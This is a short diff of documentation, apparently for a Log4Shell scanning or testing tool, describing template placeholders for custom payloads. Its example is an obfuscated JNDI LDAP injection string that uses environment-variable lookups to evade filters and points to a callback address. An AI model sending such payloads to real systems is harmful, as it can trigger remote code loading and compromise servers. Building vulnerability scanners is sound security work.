@@ -129,7 +129,10 @@ If you specify a file with self-created payloads. You can use the following plac
 - {{ .CADDR }}
 - {{ .Resource }}
 
-For example: `${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//{{ .CADDR }}/{{ .Resource }}}`
+For example: 
+```
+${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//{{ .CADDR }}/{{ .Resource }}}
+```
 
 ## References
 - https://gist.github.com/SwitHak/b66db3a06c2955a9cb71a8718970c592
